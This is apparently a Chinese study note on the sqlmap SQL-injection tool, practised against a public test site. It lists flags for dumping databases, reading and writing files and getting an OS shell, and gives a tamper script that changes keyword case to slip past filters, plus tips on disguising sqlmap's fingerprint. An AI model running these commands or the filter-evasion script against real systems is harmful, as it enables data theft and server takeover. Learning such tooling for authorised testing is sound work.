# WEB攻防-注入工具&SQLMAP&Tamper编写&指纹修改&高权限操作&目录架构

\#参考：

https://www.cnblogs.com/bmjoker/p/9326258.html

 

\#数据猜解-库表列数据&字典

测试：http://vulnweb.com/

--current-db                      （获取当前数据库名）

--tables -D ""                       

--columns -T "" -D ""

--dump -C "" -C "" -T ""

 

\#权限操作-文件&命令&交互式

测试：MYSQL高权限注入

引出权限：

--is-dba --privileges

引出文件：

--file-read --file-write --file-dest 

引出命令：

--os-cmd= --os-shell --sql-shell

 

\#提交方法-POST&HEAD&JSON

测试：Post Cookie Json

--data ""

--cookie ""

-r 1.txt

 

\#绕过模块-Tamper脚本-使用&开发

测试：base64注入 有过滤的注入

--tamper=base64encode.py

--tamper=test.py

from lib.core.enums import PRIORITY

 

__priority__ = PRIORITY.LOW

 

def dependencies():

  pass

 

def tamper(payload, **kwargs):

  if payload:    

​    payload = payload.replace('SELECT','sElEct')

​    payload = payload.replace('OR','Or')

​    payload = payload.replace('AND','And')

​    payload = payload.replace('SLEEP','SleeP')

​    payload = payload.replace('ELT','Elt')

  return payload

 

 

\#分析拓展-代理&调试&指纹&风险&等级

1、后期分析调试：

-v=(0-6)  #详细的等级(0-6)

--proxy "http://xx:xx" #代理注入

 

2、打乱默认指纹：  ==替换sqlmap头==

--user-agent ""  #自定义user-agent

--random-agent  #随机user-agent

--time-sec=(2,5) #延迟响应，默认为5

 

3、使用更多的测试：测试Header注入

--level=(1-5) #要执行的测试水平等级，默认为1 

--risk=(0-3)  #测试执行的风险等级，默认为1 

<img src="images/sqlmap思维导图.jpg" alt="sqlmap思维导图" style="zoom: 200%;" />